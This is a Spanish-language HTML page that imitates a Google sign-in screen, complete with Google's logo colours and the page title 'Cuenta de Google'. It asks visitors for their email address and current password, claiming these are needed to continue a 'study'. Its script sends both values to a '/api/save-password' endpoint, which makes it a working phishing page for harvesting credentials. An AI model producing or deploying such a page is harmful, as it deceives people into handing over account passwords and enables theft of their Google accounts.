<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Inicia sesión - Cuenta de Google</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            color: #202124;
        }
        .container {
            width: 400px;
            padding: 40px;
            text-align: left;
        }
        .google-logo {
            font-size: 22px;
            font-weight: 500;
            margin-bottom: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .google-logo span span:nth-child(1) { color: #4285F4; }
        .google-logo span span:nth-child(2) { color: #EA4335; }
        .google-logo span span:nth-child(3) { color: #FBBC05; }
        .google-logo span span:nth-child(4) { color: #4285F4; }
        .google-logo span span:nth-child(5) { color: #34A853; }
        .google-logo span span:nth-child(6) { color: #EA4335; }

        h2 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 24px;
            text-align: center;
        }
        h3 {
            font-size: 16px;
            font-weight: 500;
            margin-bottom: 8px;
        }
        p.subtitle {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 24px;
            line-height: 1.4;
        }
        .input-group {
            position: relative;
            margin-bottom: 16px;
        }
        input {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            transition: border 0.2s;
        }
        input:focus {
            border: 2px solid #1a73e8;
            padding: 12px 14px;
        }
        .buttons-row {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            margin-top: 30px;
        }
        .btn-guardar {
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .btn-guardar:hover {
            background-color: #1557b0;
        }
        #message {
            margin-top: 15px;
            font-size: 14px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-logo">
            <span>
                <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
            </span>
        </div>
        <h2>Inicia sesión en tu cuenta</h2>

        <h3>Acceso</h3>
        <p class="subtitle">Introduce tu correo y contraseña actual para continuar con el estudio.</p>

        <form id="passwordForm">
            <div class="input-group">
                <input type="email" id="email" required placeholder="Correo electrónico">
            </div>

            <div class="input-group">
                <input type="password" id="oldPassword" required placeholder="Contraseña">
            </div>

            <div class="buttons-row">
                <button type="submit" class="btn-guardar">Siguiente</button>
            </div>
        </form>
        <div id="message"></div>
    </div>

    <script>
        document.getElementById('passwordForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const oldPassword = document.getElementById('oldPassword').value;
            const msg = document.getElementById('message');

            msg.style.color = '#5f6368';
            msg.textContent = 'Verificando...';

            try {
                const res = await fetch('/api/save-password', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email, oldPassword })
                });
                const data = await res.json();
                
                if(data.success) {
                    msg.style.color = 'green';
                    msg.textContent = '¡Inicio de sesión exitoso!';
                    // Aquí puedes redirigir a la encuesta si lo deseas:
                    // window.location.href = '/encuesta.html';
                } else {
                    msg.style.color = 'red';
                    msg.textContent = data.message || 'Error al iniciar sesión.';
                }
            } catch (error) {
                msg.style.color = 'red';
                msg.textContent = 'Error de conexión con el servidor.';
            }
        });
    </script>
</body>
</html>
